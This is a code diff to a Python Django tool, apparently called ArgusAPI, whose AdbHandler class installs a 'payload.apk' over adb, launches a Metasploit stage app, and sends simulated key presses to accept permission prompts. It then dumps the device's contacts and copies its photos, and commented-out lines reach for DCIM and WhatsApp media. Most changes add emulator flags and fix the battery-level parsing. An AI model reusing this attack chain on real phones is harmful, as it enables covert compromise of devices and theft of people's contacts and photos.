@@ -8,6 +8,7 @@ import os
 import threading
 import shutil
 import django
+import sys
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'ArgusAPI.settings')
@@ -79,9 +80,9 @@ class AdbHandler:
                         continue
                     #notify the callback
                     LogHandler.LogHandler().logMessage("Detected ADB device with id: "+output[0])
-                    callback("Device Connected", adb_handler)
                     adbstatus.connec_status = "Device Connected"
                     adbstatus.save()
+                    callback("Device Connected", adb_handler)
                     break
                 else:
                     LogHandler.LogHandler().logMessage("Detected Multiple Devices, using only the first one with id "+output[0])
@@ -134,10 +135,10 @@ class AdbHandler:
         """
         # temp = threading.Thread(target = self.accept_install, name= "accept_install")
         # temp.start()
-        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "install", "-g", ARTIFACTS_PATH+"payload.apk",])
+        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e", "install", "-g", ARTIFACTS_PATH+"payload.apk",])
         # we then start the apk that we just deployed and wait for a few seconds
         LogHandler.LogHandler().logMessage("Deploying exploit onto device and launching")  
-        output = os.system(DEPENDENCY_PATH+"adb shell monkey -p com.metasploit.stage 1")
+        output = os.system(DEPENDENCY_PATH+"adb -e shell monkey -p com.metasploit.stage 1")
         # # Accept the popup
         # time.sleep(2)
         # #tab
@@ -154,11 +155,6 @@ class AdbHandler:
         time.sleep(1)
         #tab
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "61"])
-        #enter
-        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "66"])
-        time.sleep(.5)
-        #tab
-        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "61"])
         #tab
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "61"])
         #enter
@@ -171,7 +167,7 @@ class AdbHandler:
         Gets the contacts from the device
         """
         #creates the temporary file that we ne
-        code, output = self.command_handler.execute_as_bash([DEPENDENCY_PATH+"adb shell content query --uri content://contacts/phones/  --projection display_name:number:notes >> "+ARTIFACTS_PATH+"contacts.txt"])
+        code, output = self.command_handler.execute_as_bash([DEPENDENCY_PATH+"adb -e shell content query --uri content://contacts/phones/  --projection display_name:number:notes >> "+ARTIFACTS_PATH+"contacts.txt"])
         LogHandler.LogHandler().logMessage("Contacts Obtained using adb")
         return output
     
@@ -182,6 +178,8 @@ class AdbHandler:
         """
         # Get the battery level
         code, battery_level = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "dumpsys", "battery"])
+        index = battery_level.find("level:")+7
+        battery_level = battery_level[index:index+2]
         vnet_status = "Active"
         # Get the android version of the device
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.build.version.release"])
@@ -190,7 +188,7 @@ class AdbHandler:
         code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.product.model"])
         device_model = output.strip()
         # Get the device manufacturer
-        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.product.manufacturer"])
+        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.product.brand"])
         device_manufacturer = output.strip()
         data_sync_status = "Syncing"
         # Get a screenshot of the home screen
@@ -200,7 +198,7 @@ class AdbHandler:
         device = Device.objects.create(
             device_name=device_name,
             vnet_status=vnet_status,
-            battery_level=battery_level,
+            battery_level=int(battery_level),
             android_version=int(android_version),
             device_model=device_model,
             device_manufacturer=device_manufacturer,
@@ -217,15 +215,16 @@ class AdbHandler:
         """
         # # Copies all photos from the DCIM folder
         #os.mkdir(ARTIFACTS_PATH="DCIM/")
-        # code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "pull", "/sdcard/DCIM", ARTIFACTS_PATH+"DCIM"])
+        # code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e", "pull", "/sdcard/DCIM", ARTIFACTS_PATH+"DCIM"])
         # LogHandler.LogHandler().logMessage("Photos from DCIM directory have been copied to local device")
         # Copies all files from Pictures folder
-        os.mkdir(ARTIFACTS_PATH+"Pictures/")
-        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "pull", "/sdcard/Pictures", ARTIFACTS_PATH+"Pictures/"])
+        if not os.path.exists(ARTIFACTS_PATH+"Pictures/"):
+            os.mkdir(ARTIFACTS_PATH+"Pictures/")
+        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e","pull", "/sdcard/Pictures", ARTIFACTS_PATH+"Pictures/"])
         LogHandler.LogHandler().logMessage("Photos from Pictures directory have been copied to local device")
         # #Copies all the files from whatsapp media folder
         # os.mkdir(ARTIFACTS_PATH="Whatsapp/")
-        # code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "pull", "/sdcard/Android/Media/com.whatsapp/WhatsApp/Media/", ARTIFCATS_PATH+"Whatsapp"])
+        # code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "-e", "pull", "/sdcard/Android/Media/com.whatsapp/WhatsApp/Media/", ARTIFCATS_PATH+"Whatsapp"])
         # LogHandler.LogHandler().logMessage("Photos from Whatsapp directory have been copied to local device")
         # Now we walk over all files and store them in one our django files directory
         for root, dirs, files in os.walk(ARTIFACTS_PATH):
